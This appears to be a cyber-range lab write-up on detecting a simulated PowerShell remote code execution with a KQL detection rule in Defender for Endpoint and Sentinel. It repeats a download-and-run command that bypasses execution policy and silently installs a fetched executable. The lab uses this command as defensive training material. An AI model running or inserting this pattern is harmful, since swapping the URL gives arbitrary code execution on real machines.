![Remote Code Execution](https://github.com/user-attachments/assets/f3926128-a068-4ea7-8282-96b1db465a88)


  ## **🔍 Threat Hunt Report**
## **🎯 Remote Code Execution (RCE) via PowerShell Payload and Creating a Detection Rule**

## **Platforms and Languages Leveraged**

*Microsoft Sentinel 🛰️*

*Windows 10 Virtual Machines (Microsoft Azure) ☁️*

*Microsoft Defender for Endpoint 🛡️*

*Kusto Query Language (KQL) 📊*

## **Scenario: Execution of remote code on the VM by the attacker 🖥️⚠️**

An attacker gains access to the VM through a vulnerability or a phishing attack. Once inside, they execute a Remote Code Execution (RCE) command using PowerShell to download and run a malicious payload, in this case, the 7zip installer.

Here's how the attacker might have carried out the attack:

**Initial Access:**
The attacker exploited a vulnerability in the system or tricked a user into downloading and running a malicious attachment (e.g., a weaponized PowerShell script disguised as an innocuous file). 🔐

**Execution:**
After gaining access, the attacker executes the following PowerShell command to download a malicious executable (7zip installer) from a remote server:

```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```

**Payload Execution:**
The attacker uses Invoke-WebRequest to download the payload from a remote server. After the file is downloaded, the attacker silently installs the application by executing it with the /S (silent) flag, ensuring there are no user prompts during the installation. This download and installation are performed under the guise of a legitimate action, making detection more difficult. 🗂️🔍

**Detection:**
The Microsoft Defender for Endpoint (MDE) system detects unusual PowerShell activity (particularly the use of Invoke-WebRequest and Start-Process in sequence), triggering an alert and activating the custom detection rule you set up. 🚦
____

## **How We Detected the RCE Payload 🔍⚡**

The team developed a custom detection rule focused on identifying PowerShell commands that utilize Invoke-WebRequest and Start-Process — two key techniques attackers use to download and execute payloads remotely. The rule was designed to alert when these commands appeared within a certain time window. ⏳

When we ran the detection, we caught this PowerShell command running on the compromised system:
```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```
This command downloaded and silently installed a 7-Zip executable from an external source. The /S flag ensured the installer ran quietly without prompting the user. 👨‍💻🎭

Our analysis revealed the payload landed in C:\ProgramData\7z2408-x64.exe and was executed automatically, likely granting the attacker persistent remote access to the VM. 🚨🔐
_____

## **Detection and Response 🧪**

Once the suspicious behavior was spotted:

*KQL Query to Uncover the RCE PowerShell Payload 🔦*

To surface this activity, we executed the following KQL query within Microsoft Defender for Endpoint (MDE):

```
let target_machine = "stakethepot";
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName != "SYSTEM"
| where ProcessCommandLine contains "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
    or ProcessCommandLine has "Start-Process"
| order by Timestamp desc
```

This query was crafted to identify any PowerShell command leveraging Invoke-WebRequest to retrieve a file and Start-Process to run it. It specifically highlights actions tied to the malicious payload's execution, enabling us to spot the attack activity within the past 2 hours. 🕵️‍♂️⏰

![image](https://github.com/user-attachments/assets/ef25ef06-9a7e-482a-9ab0-d19bbad31e0f)
_____

## **🧩 Step 3: Build a Targeted Detection Rule for Your VM 🎛️🎯**

*🎯 Objective:*

Focus detection specifically on Remote Code Execution (RCE) activity tied to your VM. This ensures alerts are scoped to your environment and won’t interfere with other machines.

*🧪 What We’re Looking For:*

PowerShell scripts that automate the download and execution of external programs — a common attacker technique.

**💻 Example Payload Command:**
```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```
This command downloads and silently installs a 7-Zip executable from a remote location using built-in PowerShell functions.
_____

## **🪄 Step 4: Write the KQL Detection Query 🧠📡**

*🔎 Purpose:*

Use Kusto Query Language (KQL) to detect PowerShell activity that includes Invoke-WebRequest and optionally Start-Process.

**📜 KQL Snippet:**
```
let target_machine = "stakethepot";
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName != "SYSTEM"
| where ProcessCommandLine contains "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
    or ProcessCommandLine has "Start-Process"
| order by Timestamp desc
```
_______

## **🧱 Step 5: Build a Custom Detection Rule from Your KQL Query 🛎️🚦**

⚙️ Detection Rule Configuration:

To set up a detection rule from your query:

1. Navigate to the top-right corner of Microsoft Sentinel.

2. Click "Create detection rule" to begin.

3. You’ll be directed to the configuration screen where you can fill in the Alert Details, such as:

* Rule name and description

* Tactics & techniques (MITRE ATT&CK mapping)

* Trigger conditions

Entity mapping and response actions

This step formalizes your detection logic into an actionable rule that continuously monitors for suspicious behavior. 🧠📢

![image](https://github.com/user-attachments/assets/1e07eff7-70a8-497f-8698-707bd36f777a)

## **🎯🖥️Impacted Entities**

We're going to define the impacted entities (the specific VM for the detection rule. 

![image](https://github.com/user-attachments/assets/369980fe-2eae-4ead-8d92-d6fac90785fb)

## **🛠️ Actions:**
A selection of actions is listed that should be taken after the incident is triggered. For this specific rule, we want to make sure the VM is isolated, and we collect the information package. 

![image](https://github.com/user-attachments/assets/ac25138a-7dab-4c3b-b7ac-206e0253d617)

## **📋 Summary: Final Review Before Submission ✅🔍**

Before submitting your detection rule, take a moment to review the configuration summary to ensure everything is accurate and aligned with your security objectives.

**✅ Key Items to Confirm:**

*Rule Name & Description 🏷️*

* Clearly states the purpose and scope of the rule.

*Impacted Entities 🖥️*

* Properly scoped to the specific machine you are monitoring.

*Automated Actions ⚙️*

* Confirm that VM isolation and investigation package collection are selected (if applicable).

Once everything looks good, go ahead and click “Submit” to deploy the detection rule.

![image](https://github.com/user-attachments/assets/c91c9f50-60aa-453d-a51e-aef6ca7d82e1)

Set the detection rule with the following options:

- ✅ Isolate Device
- ✅ Collect Investigation Package

These settings ensure that the VM is automatically isolated and an investigation package is collected whenever the rule is triggered. By setting this up, you'll have a proactive defense mechanism to automatically isolate compromised systems and collect critical investigation data when suspicious activity, such as PowerShell-based RCE, is detected. 🛡️💻
_____

## **🔄 Step 6: Trigger the Detection Rule ⚙️🚨**

**▶️ Run the Command:**

Manually execute the PowerShell command to simulate an attack and trigger the detection. 

**⏳ Monitor Logs in MDE:**

Check Microsoft Defender for Endpoint (MDE) for new logs related to PowerShell activity.

If your detection rule is working as expected, your VM should automatically isolate.

If you're unable to connect to the VM, this likely confirms that the isolation action was successfully triggered. 🚫
_____

## **🕵️‍♀️ Step 7: Investigate the Incident 🧩🔎**

**🔍 Navigate to the MDE Portal:**

* Open the Microsoft Defender for Endpoint portal.

* Locate the affected VM in the list of onboarded devices.

**🔐 Check Isolation Status:**

* Click the three-dot menu (⋯) next to the VM.

* If the VM is isolated, you'll have the option to release it.

* For now, head to the Action Center to access the investigation artifacts.

**📦 Review the Investigation Package:**

* The investigation package includes vital forensic data for incident analysis, such as:

**🧬 Process Trees**

* 🧾 File & Registry Modifications

* 🌐 Network Connections

* 🗂️ Event Logs

* 🧠 Memory Dumps

This data helps identify how the attack unfolded and what impact it had.
______

## **🔧 Step 8: Resolve the Alert ✅🔐**

**👤 Assign the Alert:**

* Locate the alert generated by your custom detection rule.

* Assign it to your user account or a designated analyst.

**✅ Resolve:**

Once the alert has been reviewed and the threat confirmed or contained, resolve the alert in the portal to close the incident.
_____

## **🧠 MITRE ATT&CK Mapping: Remote Code Execution via PowerShell**

| Tactic                   | Technique                         | Technique ID | Description                                                                               |
| ------------------------ | --------------------------------- | ------------ | ----------------------------------------------------------------------------------------- |
| **Execution**            | PowerShell                        | `T1059.001`  | The attacker uses PowerShell to execute commands or scripts.                              |
| **Execution**            | Command and Scripting Interpreter | `T1059`      | General use of scripting environments like PowerShell, Bash, or CMD.                      |
| **Command and Control**  | Application Layer Protocol        | `T1071.001`  | Uses HTTPS (via `Invoke-WebRequest`) to communicate with external servers.                |
| **Defense Evasion**      | Bypass User Account Control       | `T1548.002`  | Execution with elevated privileges by bypassing policy (e.g., `-ExecutionPolicy Bypass`). |
| **Persistence**          | Scheduled Task/Job                | `T1053`      | (If used in future stages) May leverage scheduled jobs to persist payloads.               |
| **Initial Access**       | Phishing                          | `T1566`      | The attacker could deliver the RCE payload via a phishing email or link.                  |
| **Privilege Escalation** | Abuse Elevation Control Mechanism | `T1548`      | Use of flags like `-ExecutionPolicy Bypass` to override restrictions.                     |
______

## **✅ Conclusion**

This scenario demonstrates how attackers can exploit built-in Windows utilities like PowerShell to perform Remote Code Execution (RCE) using commands such as Invoke-WebRequest and Start-Process. By simulating this behavior in a controlled environment, we showcased how to detect, respond to, and investigate such activity using Microsoft Defender for Endpoint, Microsoft Sentinel, and KQL.

Mapping the activity to the MITRE ATT&CK framework reinforces its relevance to real-world adversary techniques and highlights the importance of proactive detection engineering, automation, and response capabilities in modern security operations.












